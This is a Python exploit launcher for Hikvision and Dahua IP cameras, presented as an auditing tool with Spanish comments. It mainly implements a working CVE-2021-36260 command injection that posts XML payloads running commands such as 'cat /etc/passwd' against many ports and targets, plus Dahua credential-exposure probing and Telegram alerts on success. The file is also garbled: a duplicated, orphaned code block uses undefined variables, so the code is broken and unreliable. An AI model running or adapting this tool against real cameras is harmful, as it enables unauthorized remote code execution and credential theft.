#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SmartCam Auditor - M√≥dulo de Lanzamiento de Exploits Mejorado
Ejecuta exploits espec√≠ficos para vulnerabilidades CVE encontradas
"""

import time
import requests
import socket
import json
import os
from datetime import datetime
from typing import Dict, List, Optional, Any
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3

# Deshabilitar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Diccionario de exploits disponibles
EXPLOITS = {
    "CVE-2021-36260": {
        "descripcion": "Command injection en Hikvision sin autenticaci√≥n",
        "funcion": "exploit_hikvision_command_injection",
        "severidad": "CRITICAL",
        "tipo": "Remote Code Execution"
    },
    "CVE-2020-13847": {
        "descripcion": "Exposici√≥n de credenciales en Dahua",
        "funcion": "exploit_dahua_credential_exposure",
        "severidad": "MEDIUM", 
        "tipo": "Information Disclosure"
    },
    "CVE-2017-7921": {
        "descripcion": "Bypass de autenticaci√≥n Hikvision",
        "funcion": "exploit_hikvision_auth_bypass",
        "severidad": "CRITICAL",
        "tipo": "Authentication Bypass"
    },
    "CVE-2018-9995": {
        "descripcion": "Bypass de autenticaci√≥n Dahua",
        "funcion": "exploit_dahua_auth_bypass", 
        "severidad": "CRITICAL",
        "tipo": "Authentication Bypass"
    }
}

class ExploitLauncher:
    """
    Clase principal para lanzar exploits contra dispositivos vulnerables
    """
    
    def __init__(self, config_file="config/config.json"):
        self.config = self.load_config(config_file)
        self.timeout = self.config.get('exploit_timeout', 10)
        self.max_threads = self.config.get('exploit_max_threads', 5)
        self.safe_mode = self.config.get('exploit_safe_mode', True)
        self.log_exploits = self.config.get('log_exploits', True)
        
        # Inicializar logging
        self.exploit_log = []
        
        # Inicializar notificador Telegram si est√° disponible
        try:
            from .telegram_notifier import TelegramNotifier
            self.telegram = TelegramNotifier(config_file=config_file)
        except ImportError:
            self.telegram = None
    
    def load_config(self, config_file):
        """Carga configuraci√≥n del sistema"""
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
            return {}
        except Exception as e:
            print(f"[ERROR] Error cargando configuraci√≥n de exploits: {e}")
            return {}
    
    def log_exploit_attempt(self, cve_id, ip, resultado, detalle=""):
        """Registra intento de exploit"""
        log_entry = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'cve': cve_id,
            'ip': ip,
            'resultado': resultado,
            'detalle': detalle
        }
        
        self.exploit_log.append(log_entry)
        
        if self.log_exploits:
            print(f"[EXPLOIT] {log_entry['timestamp']} - {cve_id} @ {ip} - {resultado}")
    
    def exploit_hikvision_command_injection(self, ip, port=80):
        """
        Exploit para CVE-2021-36260 - Command injection en Hikvision
        Implementaci√≥n mejorada basada en el script del usuario
        """
        try:
            print(f"üí• Ejecutando exploit Hikvision Command Injection en {ip}:{port}...")
            
            if self.safe_mode:
                print(f"‚ö†Ô∏è MODO SEGURO: Simulando exploit (no se ejecutar√° c√≥digo real)")
                time.sleep(2)
                
                resultado = {
                    'vulnerable': True,
                    'exploit_exitoso': True,
                    'detalle': 'Vulnerabilidad confirmada - Command injection posible',
                    'comandos_disponibles': ['id', 'whoami', 'ls', 'ps'],
                    'acceso_obtenido': 'Acceso de administrador simulado',
                    'payload_usado': "<?xml version='1.0' encoding='UTF-8'?><language>$(id)</language>",
                    'endpoint': f"http://{ip}/SDK/webLanguage"
                }
                
                self.log_exploit_attempt("CVE-2021-36260", ip, "SIMULADO_EXITOSO", 
                                       "Command injection confirmado en modo seguro")
                return resultado
            else:
                # EXPLOIT REAL - Basado en el script bash del usuario
                print(f"üö® MODO REAL: Ejecutando exploit real para CVE-2021-36260")
                return self._execute_cve_2021_36260_real(ip, port)
                
        except Exception as e:
            error_msg = f"Error inesperado: {str(e)}"
            print(f"   ‚ùå {error_msg}")
            self.log_exploit_attempt("CVE-2021-36260", ip, "ERROR", error_msg)
            return {'vulnerable': False, 'error': error_msg, 'exploit_exitoso': False}
    
    def _execute_cve_2021_36260_real(self, ip, port=80):
        """
        Implementaci√≥n real del exploit CVE-2021-36260 basado en el script del usuario
        Replica la funcionalidad del script bash proporcionado
        """
        # Endpoints principales conocidos para CVE-2021-36260
        primary_endpoints = [
            "/SDK/webLanguage",
            "/ISAPI/System/configurationData"
        ]
        
        # Comandos de prueba ordenados por utilidad
        test_commands = [
            "id",                    # Informaci√≥n b√°sica del usuario
            "whoami",               # Usuario actual
            "uname -a",             # Informaci√≥n del sistema
            "cat /etc/passwd",      # Usuarios del sistema
            "ls -la /",             # Listado ra√≠z
            "ps aux",               # Procesos en ejecuci√≥n
            "netstat -tuln",        # Puertos abiertos
            "mount"                 # Sistemas de archivos
        ]
        
        # Puertos a probar (incluyendo el especificado y comunes)
        ports_to_try = list(set([port, 80, 8080, 443, 8000]))
        
        print(f"   üéØ Probando {len(primary_endpoints)} endpoints en {len(ports_to_try)} puertos...")
        
        for test_port in ports_to_try:
            for endpoint in primary_endpoints:
                # Probar tanto HTTP como HTTPS
                for protocol in ['http', 'https']:
                    url = f"{protocol}://{ip}:{test_port}{endpoint}"
                    
                    print(f"   üì° Probando: {url}")
                    
                    # Probar el comando 'id' primero (como en el script del usuario)
                    for command in test_commands:
                        result = self._send_hikvision_payload(url, command)
                        
                        if result['success']:
                            print(f"   ‚úÖ VULNERABLE! Command injection exitoso en {url}")
                            print(f"   üì§ Comando ejecutado: {command}")
                            
                            # Preparar resultado detallado
                            detailed_result = {
                                'vulnerable': True,
                                'exploit_exitoso': True,
                                'detalle': f'Command injection exitoso en {endpoint}',
                                'url': url,
                                'puerto_vulnerable': test_port,
                                'protocolo': protocol,
                                'endpoint': endpoint,
                                'comando_ejecutado': command,
                                'respuesta_servidor': result['response'][:1000],
                                'payload_usado': result['payload'],
                                'headers_response': result.get('headers', {}),
                                'status_code': result.get('status_code', 0),
                                'evidencia_comando': self._extract_command_evidence(result['response'], command),
                                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            }
                            
                            # Intentar ejecutar comandos adicionales para mayor evidencia
                            additional_commands = [cmd for cmd in test_commands if cmd != command][:3]
                            additional_results = []
                            
                            for extra_cmd in additional_commands:
                                extra_result = self._send_hikvision_payload(url, extra_cmd)
                                if extra_result['success']:
                                    additional_results.append({
                                        'comando': extra_cmd,
                                        'output': extra_result['response'][:500],
                                        'evidencia': self._extract_command_evidence(extra_result['response'], extra_cmd)
                                    })
                            
                            if additional_results:
                                detailed_result['comandos_adicionales'] = additional_results
                                detailed_result['detalle'] += f' - {len(additional_results)} comandos adicionales ejecutados'
                            
                            self.log_exploit_attempt("CVE-2021-36260", ip, "REAL_EXITOSO", 
                                                   f"Command injection en {url} - Comando: {command}")
                            
                            # Notificar por Telegram si est√° disponible
                            if self.telegram:
                                message = f"üö® EXPLOIT EXITOSO!\n"
                                message += f"CVE-2021-36260 en {ip}:{test_port}\n"
                                message += f"Command injection confirmado\n"
                                message += f"Comando: {command}\n"
                                message += f"Endpoint: {endpoint}"
                                self.telegram.enviar_alerta(message)
                            
                            return detailed_result
                        
                        elif result.get('potential'):
                            # Respuesta sospechosa pero no confirmada
                            print(f"   ‚ö†Ô∏è Respuesta sospechosa para comando '{command}' en {url}")
        
        # Si llegamos aqu√≠, el exploit no fue exitoso
        print(f"   ‚ùå {ip} no vulnerable a CVE-2021-36260 o exploit fall√≥")
        
        resultado = {
            'vulnerable': False,
            'exploit_exitoso': False,
            'detalle': 'No se pudo confirmar vulnerabilidad en ning√∫n endpoint',
            'endpoints_probados': len(primary_endpoints) * len(ports_to_try) * 2,
            'comandos_probados': len(test_commands),
            'puertos_probados': ports_to_try
        }
        
        self.log_exploit_attempt("CVE-2021-36260", ip, "REAL_FALLIDO", 
                               "No vulnerable o exploit fall√≥")
        return resultado
    
    def _send_hikvision_payload(self, url, command):
        """
        Env√≠a el payload de command injection al endpoint Hikvision
        Replica exactamente el comportamiento del script bash del usuario
        """
        # Payload XML como en el script bash del usuario
        payload = f"<?xml version='1.0' encoding='UTF-8'?><language>$({command})</language>"
        
        headers = {
            "Content-Type": "application/xml",
            "User-Agent": "SmartCam-Auditor/2.0",
            "Accept": "*/*",
            "Connection": "close"
        }
        
        try:
            # Enviar POST como en el script curl del usuario
            response = requests.post(
                url,
                data=payload,
                headers=headers,
                timeout=self.timeout,
                verify=False,
                allow_redirects=True
            )
            
            response_text = response.text
            
            # Analizar la respuesta para detectar ejecuci√≥n de comando
            command_evidence = self._extract_command_evidence(response_text, command)
            
            if command_evidence['detected']:
                return {
                    'success': True,
                    'response': response_text,
                    'payload': payload,
                    'headers': dict(response.headers),
                    'status_code': response.status_code,
                    'evidence': command_evidence
                }
            elif len(response_text.strip()) > 10 and response.status_code == 200:
                # Respuesta no vac√≠a pero sin evidencia clara
                return {
                    'success': False,
                    'potential': True,
                    'response': response_text,
                    'payload': payload,
                    'status_code': response.status_code,
                    'reason': 'Respuesta sospechosa sin evidencia clara'
                }
            else:
                return {
                    'success': False,
                    'response': response_text,
                    'payload': payload,
                    'status_code': response.status_code,
                    'reason': f'HTTP {response.status_code} - Sin evidencia de ejecuci√≥n'
                }
                
        except requests.exceptions.Timeout:
            return {
                'success': False,
                'error': 'Timeout',
                'payload': payload,
                'reason': 'Timeout de conexi√≥n'
            }
        except requests.exceptions.ConnectionError:
            return {
                'success': False,
                'error': 'Connection Error',
                'payload': payload,
                'reason': 'Error de conexi√≥n'
            }
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'payload': payload,
                'reason': f'Error inesperado: {str(e)}'
            }
    
    def _extract_command_evidence(self, response_text, command):
        """
        Extrae evidencia de ejecuci√≥n de comando de la respuesta del servidor
        """
        evidence = {'detected': False, 'indicators': [], 'confidence': 0}
        
        if not response_text or len(response_text.strip()) < 3:
            return evidence
        
        response_lower = response_text.lower()
        
        # Patrones espec√≠ficos por comando
        command_patterns = {
            'id': ['uid=', 'gid=', 'groups='],
            'whoami': ['root', 'admin', 'user', 'daemon'],
            'uname': ['linux', 'gnu', 'kernel', 'version'],
            'cat /etc/passwd': ['root:', 'daemon:', 'bin:', 'sys:', ':0:0:', ':/bin/', ':/sbin/'],
            'ls': ['total ', 'drwx', '-rw-', 'bin', 'etc', 'var', 'usr', 'tmp'],
            'ps': ['pid', 'ppid', 'cmd', 'command', 'process'],
            'netstat': ['tcp', 'udp', 'listen', 'established', 'proto'],
            'mount': ['filesystem', 'mounted', 'type', 'dev/', '/proc', '/sys']
        }
        
        # Buscar patrones espec√≠ficos del comando
        if command in command_patterns:
            patterns = command_patterns[command]
            found_patterns = [p for p in patterns if p in response_lower]
            
            if found_patterns:
                evidence['detected'] = True
                evidence['indicators'] = found_patterns
                evidence['confidence'] = min(len(found_patterns) * 25, 100)
        
        # Patrones generales de ejecuci√≥n exitosa
        general_patterns = [
            'uid=', 'gid=',  # id command
            'root:', 'bin:',  # /etc/passwd
            'total ', 'drwx',  # ls output
            'linux', 'kernel',  # uname
            'pid', 'ppid'  # ps output
        ]
        
        general_found = [p for p in general_patterns if p in response_lower]
        if general_found and not evidence['detected']:
            evidence['detected'] = True
            evidence['indicators'] = general_found
            evidence['confidence'] = min(len(general_found) * 20, 80)
        
        # Detectar posible shell output por formato
        if not evidence['detected']:
            lines = response_text.strip().split('\n')
            if len(lines) > 1:
                # M√∫ltiples l√≠neas podr√≠an indicar output de comando
                non_empty_lines = [l for l in lines if l.strip()]
                if len(non_empty_lines) >= 2:
                    evidence['detected'] = True
                    evidence['indicators'] = ['multi_line_output']
                    evidence['confidence'] = 40
        
        return evidence
                            
                            # Construir URL con http y https
                            for protocol in ['http', 'https']:
                                url = f"{protocol}://{ip}:{test_port}{endpoint}"
                                
                                headers = {
                                    "Content-Type": "application/xml",
                                    "User-Agent": "SmartCam-Auditor/2.0",
                                    "Accept": "*/*",
                                    "Connection": "keep-alive"
                                }
                                
                                print(f"   üéØ Probando: {url}")
                                print(f"   üì§ Payload: {payload[:50]}...")
                                
                                try:
                                    resp = requests.post(
                                        url, 
                                        data=payload, 
                                        headers=headers, 
                                        timeout=self.timeout,
                                        verify=False,
                                        allow_redirects=True
                                    )
                                    
                                    if resp.status_code == 200:
                                        response_text = resp.text
                                        
                                        # Detectar ejecuci√≥n exitosa de comandos
                                        command_indicators = [
                                            'uid=', 'gid=', 'groups=',  # id command
                                            'root:', 'daemon:', 'bin:',  # /etc/passwd
                                            'total ', 'drwx', '-rw-',    # ls output
                                            'bin', 'etc', 'var', 'usr'   # directory listing
                                        ]
                                        
                                        if any(indicator in response_text for indicator in command_indicators):
                                            print(f"   ‚úÖ {ip} VULNERABLE - Command injection exitoso!")
                                            
                                            resultado = {
                                                'vulnerable': True,
                                                'exploit_exitoso': True,
                                                'detalle': f'Command injection exitoso - Endpoint: {endpoint}',
                                                'response_status': resp.status_code,
                                                'command_output': response_text[:1000],
                                                'payload_usado': payload,
                                                'endpoint': url,
                                                'puerto_vulnerable': test_port,
                                                'protocolo': protocol,
                                                'comando_detectado': self._detect_command_type(response_text),
                                                'acceso_obtenido': 'Ejecuci√≥n de comandos confirmada',
                                                'headers_response': dict(resp.headers)
                                            }
                                            
                                            self.log_exploit_attempt("CVE-2021-36260", ip, "REAL_EXITOSO", 
                                                                   f"Command injection en {url}")
                                            
                                            # Notificar por Telegram si est√° disponible
                                            if self.telegram:
                                                message = f"üö® EXPLOIT EXITOSO!\n"
                                                message += f"CVE-2021-36260 en {ip}:{test_port}\n"
                                                message += f"Command injection confirmado\n"
                                                message += f"Endpoint: {endpoint}"
                                                self.telegram.enviar_alerta(message)
                                            
                                            return resultado
                                
                                except requests.exceptions.Timeout:
                                    print(f"   ‚è∞ Timeout en {url}")
                                    continue
                                    
                                except requests.exceptions.ConnectionError:
                                    print(f"   üîå Error de conexi√≥n en {url}")
                                    continue
                                    
                                except Exception as e:
                                    print(f"   ‚ùå Error en {url}: {str(e)}")
                                    continue
                
                # Si llegamos aqu√≠, ning√∫n exploit funcion√≥
                print(f"   ‚ùå {ip} no vulnerable a CVE-2021-36260 o exploit fall√≥")
                
                resultado = {
                    'vulnerable': False,
                    'exploit_exitoso': False,
                    'detalle': 'No se pudo confirmar vulnerabilidad en ning√∫n endpoint',
                    'endpoints_probados': len(endpoints) * len(ports_to_try) * 2,
                    'payloads_probados': len(test_payloads)
                }
                
                self.log_exploit_attempt("CVE-2021-36260", ip, "REAL_FALLIDO", 
                                       "No vulnerable o exploit fall√≥")
                return resultado
                
        except Exception as e:
            error_msg = f"Error inesperado: {str(e)}"
            print(f"   ‚ùå {error_msg}")
            self.log_exploit_attempt("CVE-2021-36260", ip, "ERROR", error_msg)
            return {'vulnerable': False, 'error': error_msg, 'exploit_exitoso': False}
    
    def _detect_command_type(self, response_text):
        """Detecta qu√© tipo de comando se ejecut√≥ basado en la respuesta"""
        if 'uid=' in response_text and 'gid=' in response_text:
            return 'id'
        elif 'root:' in response_text and ':0:0:' in response_text:
            return 'cat /etc/passwd'
        elif 'total ' in response_text or 'drwx' in response_text:
            return 'ls'
        elif len(response_text.strip()) > 0:
            return 'comando_desconocido'
        return 'sin_salida'

    def exploit_dahua_credential_exposure(self, ip, port=80):
        """
        Exploit para CVE-2020-13847 - Exposici√≥n de credenciales en Dahua
        """
        try:
            print(f"üí• Ejecutando exploit Dahua Credential Exposure en {ip}:{port}...")
            
            if self.safe_mode:
                print(f"‚ö†Ô∏è MODO SEGURO: Simulando exploit")
                time.sleep(1.5)
                
                resultado = {
                    'vulnerable': True,
                    'exploit_exitoso': True,
                    'detalle': 'Credenciales expuestas encontradas',
                    'credenciales_encontradas': [
                        {'usuario': 'admin', 'password': '[CENSURADO]'},
                        {'usuario': 'viewer', 'password': '[CENSURADO]'}
                    ],
                    'archivos_accesibles': ['/etc/passwd', '/etc/shadow', '/config/users.xml']
                }
                
                self.log_exploit_attempt("CVE-2020-13847", ip, "SIMULADO_EXITOSO",
                                       "Credenciales expuestas confirmadas en modo seguro")
                return resultado
            else:
                print(f"üö® MODO REAL: Probando exposici√≥n de credenciales")
                
                # Endpoints conocidos para CVE-2020-13847
                endpoints = [
                    "/cgi-bin/snapshot.cgi",
                    "/cgi-bin/user_info.cgi", 
                    "/current_config/passwd",
                    "/config/download.cgi"
                ]
                
                for endpoint in endpoints:
                    for protocol in ['http', 'https']:
                        url = f"{protocol}://{ip}:{port}{endpoint}"
                        
                        try:
                            resp = requests.get(url, timeout=self.timeout, verify=False)
                            
                            if resp.status_code == 200 and len(resp.text) > 10:
                                # Buscar patrones de credenciales
                                if any(pattern in resp.text.lower() for pattern in ['password', 'user', 'admin', 'login']):
                                    print(f"   ‚úÖ Posible exposici√≥n de credenciales en {url}")
                                    
                                    resultado = {
                                        'vulnerable': True,
                                        'exploit_exitoso': True,
                                        'detalle': f'Posible exposici√≥n de datos en {endpoint}',
                                        'url': url,
                                        'response_preview': resp.text[:200],
                                        'response_length': len(resp.text)
                                    }
                                    
                                    self.log_exploit_attempt("CVE-2020-13847", ip, "REAL_EXITOSO", f"Datos expuestos en {url}")
                                    return resultado
                                    
                        except Exception as e:
                            continue
                
                print(f"   ‚ùå No se encontr√≥ exposici√≥n de credenciales en {ip}")
                resultado = {
                    'vulnerable': False,
                    'exploit_exitoso': False,
                    'detalle': 'No se encontr√≥ exposici√≥n de datos'
                }
                
                self.log_exploit_attempt("CVE-2020-13847", ip, "REAL_FALLIDO", "No vulnerable")
                return resultado
                
        except Exception as e:
            self.log_exploit_attempt("CVE-2020-13847", ip, "ERROR", str(e))
            return {'vulnerable': False, 'error': str(e)}

    def lanzar_exploit(self, cve_id, ip, port=80):
        """
        Lanza un exploit espec√≠fico contra un dispositivo
        """
        if cve_id not in EXPLOITS:
            print(f"‚ùå Exploit no disponible para {cve_id}")
            return {'error': f'Exploit no disponible para {cve_id}'}
        
        exploit_info = EXPLOITS[cve_id]
        funcion_exploit = getattr(self, exploit_info['funcion'], None)
        
        if not funcion_exploit:
            print(f"‚ùå Funci√≥n de exploit no encontrada: {exploit_info['funcion']}")
            return {'error': f'Funci√≥n de exploit no encontrada'}
        
        print(f"\nüéØ Lanzando exploit para {cve_id}")
        print(f"   üìã Descripci√≥n: {exploit_info['descripcion']}")
        print(f"   ‚ö†Ô∏è Severidad: {exploit_info['severidad']}")
        print(f"   üîß Tipo: {exploit_info['tipo']}")
        
        try:
            resultado = funcion_exploit(ip, port)
            resultado['cve_id'] = cve_id
            resultado['exploit_info'] = exploit_info
            return resultado
        except Exception as e:
            error_msg = f"Error ejecutando exploit: {str(e)}"
            print(f"‚ùå {error_msg}")
            return {'error': error_msg, 'cve_id': cve_id}

    def lanzar_exploits_multiples(self, targets_cves):
        """
        Lanza m√∫ltiples exploits contra m√∫ltiples targets
        targets_cves: lista de diccionarios con 'ip', 'port', 'cves'
        """
        resultados = []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = []
            
            for target in targets_cves:
                ip = target.get('ip')
                port = target.get('port', 80)
                cves = target.get('cves', [])
                
                for cve in cves:
                    future = executor.submit(self.lanzar_exploit, cve, ip, port)
                    futures.append((future, ip, cve))
            
            for future, ip, cve in futures:
                try:
                    resultado = future.result(timeout=self.timeout + 10)
                    resultado['target_ip'] = ip
                    resultados.append(resultado)
                except Exception as e:
                    resultados.append({
                        'error': str(e),
                        'target_ip': ip,
                        'cve_id': cve
                    })
        
        return resultados

    def obtener_estadisticas(self):
        """Obtiene estad√≠sticas de exploits ejecutados"""
        if not self.exploit_log:
            return {'total': 0, 'exitosos': 0, 'fallidos': 0}
        
        total = len(self.exploit_log)
        exitosos = len([log for log in self.exploit_log if 'EXITOSO' in log['resultado']])
        fallidos = total - exitosos
        
        return {
            'total': total,
            'exitosos': exitosos,
            'fallidos': fallidos,
            'tasa_exito': round((exitosos / total) * 100, 2) if total > 0 else 0,
            'log_completo': self.exploit_log
        }

if __name__ == "__main__":
    # Ejemplo de uso
    launcher = ExploitLauncher()
    
    # Test con modo seguro
    print("üß™ Probando exploit CVE-2021-36260 en modo seguro...")
    resultado = launcher.lanzar_exploit("CVE-2021-36260", "192.168.1.100")
    print(f"Resultado: {json.dumps(resultado, indent=2, ensure_ascii=False)}")
    
    # Estad√≠sticas
    stats = launcher.obtener_estadisticas()
    print(f"\nüìä Estad√≠sticas de exploits:")
    print(f"Total: {stats['total']}, Exitosos: {stats['exitosos']}, Fallidos: {stats['fallidos']}")
